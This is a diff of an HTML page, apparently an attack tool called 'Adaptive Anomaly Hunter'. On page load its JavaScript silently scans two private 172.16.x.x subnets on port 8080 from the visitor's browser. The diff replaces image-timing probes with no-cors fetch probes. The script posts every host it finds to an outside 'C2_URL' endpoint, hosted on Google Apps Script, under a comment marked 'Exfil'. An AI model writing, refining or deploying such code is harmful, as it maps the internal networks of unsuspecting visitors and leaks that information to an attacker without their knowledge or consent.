@@ -1,67 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Adaptive Anomaly Hunter // Precision Mode</title>
+    <title>Adaptive Anomaly Hunter // Fetch Mode</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .success { border: 2px solid #0f0; padding: 15px; margin: 20px 0; background: #002200; }
+        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        .success { border: 2px solid #0f0; padding: 10px; margin: 10px 0; background: #002200; font-size: 1.2em; }
         .stat-box { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; color: #888; }
         .highlight { color: #fff; font-weight: bold; }
-        #progress-bar { width: 100%; background: #111; height: 10px; margin-top: 5px; }
-        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
+        #progress-bar { width: 100%; background: #222; height: 10px; margin-top: 5px; }
+        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.1s; }
     </style>
 </head>
 <body>
-    <h1>// ADAPTIVE ANOMALY HUNTER [Precision Mode] //</h1>
+    <h1>// ANOMALY HUNTER [FETCH API] //</h1>
     
     <div class="stat-box">
-        <div>TARGET SCOPE: <span class="highlight">172.16.0.0/24 & 172.16.1.0/24</span></div>
-        <div>STRATEGY: <span class="highlight">Low Concurrency (Precision Timing)</span></div>
+        <div>METHOD: <span class="highlight">Fetch (Connection Detection)</span></div>
+        <div>SCOPE: <span class="highlight">172.16.0.0/24 & 172.16.1.0/24</span></div>
     </div>
 
-    <div id="scanner-hud">
-        <div class="stat-box">
-            <div>STATUS: <span id="scan-status" class="highlight">Initializing...</span></div>
-            <div>LAST BATCH AVG: <span id="batch-avg">...</span></div>
-            <div>PROGRESS: <span id="progress-text">0/508</span></div>
-            <div id="progress-bar"><div id="progress-fill"></div></div>
-        </div>
-        <div id="results"></div>
+    <div class="stat-box">
+        <div>STATUS: <span id="scan-status" class="highlight">Initializing...</span></div>
+        <div>PROGRESS: <span id="progress-text">0/508</span></div>
+        <div id="progress-bar"><div id="progress-fill"></div></div>
     </div>
+    
+    <div id="results"></div>
 
     <script>
         // --- CONFIGURATION ---
         var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
         var TARGET_PORT = 8080;
-        
-        // CRITICAL TUNING FOR ACCURACY
-        var TIMEOUT_LIMIT = 500; // Increased to ensure we don't cut off legitimate but slightly slow comms
-        var CONCURRENCY = 5;     // DRASTICALLY REDUCED. 5 is safe. 20 was clogging the browser queue.
-        var BATCH_DELAY = 50;    // 50ms cooldown between batches to clear the stack.
+        var CONCURRENCY = 8;     // Safe limit for ChromeOS/Linux sockets
+        var TIMEOUT = 1500;      // Abort connection attempts after 1.5s
 
-        // --- TARGET GENERATION ---
+        // --- TARGET LIST GENERATION ---
         var queue = [];
-        var subnets = [0, 1];
-        
-        subnets.forEach(function(subnet) {
+        // Generate both subnets
+        [0, 1].forEach(subnet => {
             for(var i=1; i<255; i++) {
                 queue.push("172.16." + subnet + "." + i);
             }
         });
 
+        // SHUFFLE QUEUE: This prevents a block of dead IPs from clogging the stack
+        // and ensures we hit 1.40 much earlier on average.
+        for (let i = queue.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [queue[i], queue[j]] = [queue[j], queue[i]];
+        }
+
         var totalTargets = queue.length;
-        var results = []; 
+        var completed = 0;
 
-        // --- SCANNER ENGINE ---
+        // --- CORE SCANNER LOGIC ---
+        async function checkTarget(ip) {
+            const controller = new AbortController();
+            const signal = controller.signal;
+            const id = setTimeout(() => controller.abort(), TIMEOUT);
 
-        function reportSuccess(ip, time, baseline) {
-            var msg = "TARGET CONFIRMED: " + ip;
-            var details = "Response: " + time + "ms (Baseline: ~" + baseline + "ms)";
-            
-            // Visual Alert
+            try {
+                // 'no-cors' is the magic. 
+                // If it Connects (even 404/500), it RESOLVES.
+                // If it Refuses/Timeouts, it REJECTS.
+                await fetch(`http://${ip}:${TARGET_PORT}/favicon.ico?r=${Math.random()}`, { 
+                    method: 'HEAD',
+                    mode: 'no-cors', 
+                    signal: signal 
+                });
+                
+                // If we get here, the TCP connection was successful!
+                reportSuccess(ip);
+
+            } catch (error) {
+                // Connection Refused or Timeout. Ignore.
+            } finally {
+                clearTimeout(id);
+                updateProgress();
+            }
+        }
+
+        function reportSuccess(ip) {
             var div = document.createElement("div");
             div.className = "success";
-            div.innerHTML = "<h2>" + msg + "</h2><p>" + details + "</p>";
+            div.innerText = ">> HOST CONFIRMED: " + ip;
             document.getElementById('results').appendChild(div);
 
             // Exfil
@@ -70,95 +92,39 @@
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
                     timestamp: new Date().toISOString(),
-                    type: "ANOMALY_CONFIRMED",
-                    target_ip: ip,
-                    latency: time,
-                    baseline: baseline
+                    type: "HOST_CONFIRMED",
+                    target_ip: ip
                 })
             });
         }
 
-        function scan(ip) {
-            return new Promise(resolve => {
-                var start = performance.now();
-                var img = new Image();
-                var isDone = false;
-
-                var finish = function(status) {
-                    if(isDone) return;
-                    isDone = true;
-                    var duration = Math.round(performance.now() - start);
-                    
-                    // Cleanup
-                    img = null; 
-                    
-                    resolve({ip: ip, time: duration, status: status});
-                };
-
-                img.onload = () => finish("open");
-                img.onerror = () => finish("error"); // This is our target state (TCP RST or 404 is fast)
-
-                // Timeout Hard Stop
-                setTimeout(function() {
-                    if(!isDone) {
-                        isDone = true;
-                        img.src = ""; // Kill pending
-                        resolve({ip: ip, time: TIMEOUT_LIMIT, status: "timeout"});
-                    }
-                }, TIMEOUT_LIMIT);
-
-                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
-            });
+        function updateProgress() {
+            completed++;
+            document.getElementById('progress-text').innerText = completed + "/" + totalTargets;
+            document.getElementById('progress-fill').style.width = ((completed / totalTargets) * 100) + "%";
+            
+            if(completed >= totalTargets) {
+                if(document.getElementById('results').innerHTML === "") {
+                    document.getElementById('scan-status').innerText = "SCAN COMPLETE. NO HOSTS FOUND.";
+                } else {
+                    document.getElementById('scan-status').innerText = "SCAN COMPLETE.";
+                }
+            }
         }
 
+        // --- BATCH RUNNER ---
         async function runBatch() {
-            document.getElementById('scan-status').innerText = "Scanning...";
+            document.getElementById('scan-status').innerText = "Scanning (Randomized Order)...";
             
+            // Limit concurrency
             while(queue.length > 0) {
-                var batch = [];
-                // Build Batch
-                for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
-                    batch.push(queue.shift());
-                }
-
-                // Execute Batch
-                var batchPromises = batch.map(ip => scan(ip));
-                var batchResults = await Promise.all(batchPromises);
-
-                // REAL-TIME ANALYSIS (Don't wait for end)
-                // If any IP in this batch was significantly faster than the others (and under 50ms)
-                // we flag it immediately.
-                batchResults.forEach(r => {
-                    results.push(r);
-                    
-                    // HEURISTIC: 
-                    // Dead IPs = 200ms+ (timeout) or very slow connection refused
-                    // Live Target = < 50ms (usually <10ms on LAN)
-                    if(r.time < 50) { 
-                        reportSuccess(r.ip, r.time, "200+");
-                    }
-                });
-
-                // Update UI
-                var progress = results.length;
-                document.getElementById('progress-text').innerText = progress + "/" + totalTargets;
-                document.getElementById('progress-fill').style.width = ((progress / totalTargets) * 100) + "%";
-                document.getElementById('batch-avg').innerText = Math.round(batchResults.reduce((a,b)=>a+b.time,0)/batchResults.length) + "ms";
-
-                // Cooldown to let browser network stack breathe
-                await new Promise(r => setTimeout(r, BATCH_DELAY));
-            }
-            
-            if(document.getElementById('results').innerHTML === "") {
-                document.getElementById('scan-status').innerText = "SCAN COMPLETE. NO TARGETS FOUND.";
-            } else {
-                document.getElementById('scan-status').innerText = "SCAN COMPLETE. TARGETS FOUND.";
+                const batch = queue.splice(0, CONCURRENCY).map(ip => checkTarget(ip));
+                await Promise.all(batch);
             }
         }
 
         // Auto-start
-        setTimeout(runBatch, 1000); 
-
+        setTimeout(runBatch, 500);
     </script>
 </body>
 </html>
